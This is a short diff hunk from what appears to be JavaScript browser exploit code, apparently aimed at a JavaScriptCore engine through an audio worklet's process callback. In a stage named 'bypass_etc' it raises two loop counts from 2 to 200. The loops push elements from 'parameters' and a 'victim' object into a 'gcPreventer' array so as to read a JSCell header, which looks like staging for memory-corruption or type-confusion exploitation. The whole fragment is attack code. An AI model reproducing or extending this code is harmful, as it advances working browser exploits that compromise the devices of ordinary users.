@@ -617,14 +617,14 @@ b.process = (inputs, outputs, parameters)=>{
     else if(stage == "bypass_etc"){
         //fuck.port.postMessage(typeof parameters);
         var gcPreventer = [];
-        for (let i = 0; i < 2; i++) {
+        for (let i = 0; i < 200; i++) {
             let a = i == 0 ? parameters : victim;
             gcPreventer.push(a[0]);
         }
         jscell_header = gcPreventer[0];
         
         var gcPreventer = [];
-        for (let i = 0; i < 2; i++) {
+        for (let i = 0; i < 200; i++) {
             let a = i == 0 ? parameters : victim;
             gcPreventer.push(a[1]);
         }
